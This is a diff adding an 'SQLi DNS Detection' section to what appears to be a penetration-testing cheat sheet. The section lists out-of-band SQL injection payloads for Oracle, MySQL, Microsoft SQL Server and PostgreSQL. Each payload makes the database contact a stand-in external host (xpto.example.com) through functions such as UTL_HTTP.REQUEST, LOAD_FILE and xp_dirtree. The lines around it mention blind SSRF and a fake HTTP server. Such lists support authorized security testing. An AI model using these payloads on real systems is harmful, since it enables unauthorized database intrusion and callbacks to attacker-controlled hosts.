@@ -236,6 +236,25 @@
 ### SSRF
 	https://lab.wallarm.com/blind-ssrf-exploitation/
 
+### SQLi
+	DNS Detection
+		Oracle
+			'||(SELECT%20UTL_INADDR.GET_HOST_ADDRESS('xpto.example.com'))||'
+			'||(SELECT%20UTL_HTTP.REQUEST('http://xpto.example.com')%20FROM%20DUAL)||'
+			'||(SELECT%20HTTPURITYPE('http://xpto.example.com').GETCLOB()%20FROM%20DUAL)||'
+			'||(SELECT%20DBMS_LDAP.INIT(('xpto.example.com',80)%20FROM%20DUAL)||'
+			
+		MySQL
+			'||(SELECT%20LOAD_FILE('\\xpto.example.com'))||'
+			
+		Microsoft SQL Server
+			'+;EXEC('master..xp_dirtree"\\xpto.example.com\"');+'
+			'+;EXEC('master..xp_fileexist"\\xpto.example.com\"');+'
+			'+;EXEC('master..xp_subdirs"\\xpto.example.com\"');+'
+			
+		PostgreSQL
+			'||;COPY%20users(names)%20FROM%20'\\xpto.example.com\';||'
+
 ### Fake Server
 	# HTTP
 		python -m SimpleHTTPServer 8080
